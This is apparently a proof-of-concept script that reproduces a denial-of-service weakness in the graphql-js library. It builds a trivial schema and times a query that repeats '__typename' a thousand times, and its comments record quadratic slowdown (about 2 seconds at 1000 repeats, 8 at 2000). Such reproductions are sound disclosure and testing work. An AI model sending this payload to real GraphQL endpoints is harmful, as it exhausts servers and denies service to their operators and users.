import { performance } from "perf_hooks";
import {
  graphql,
  GraphQLSchema,
  GraphQLObjectType,
  GraphQLString,
} from "graphql";

const schema = new GraphQLSchema({
  query: new GraphQLObjectType({
    name: "RootQueryType",
    fields: {
      hello: {
        type: GraphQLString,
        resolve() {
          return "world";
        },
      },
    },
  }),
});

const maliciousQuery = `{ ${"__typename ".repeat(1000)}}`;
// 1000 = Took 1999.3179998397827 milliseconds
// 2000 = Took 8064.870334148407 milliseconds

const startTime = performance.now();

const result = await graphql({ schema, source: maliciousQuery });

const endTime = performance.now();

console.log(`Took ${endTime - startTime} milliseconds`);

console.log(JSON.stringify(result));
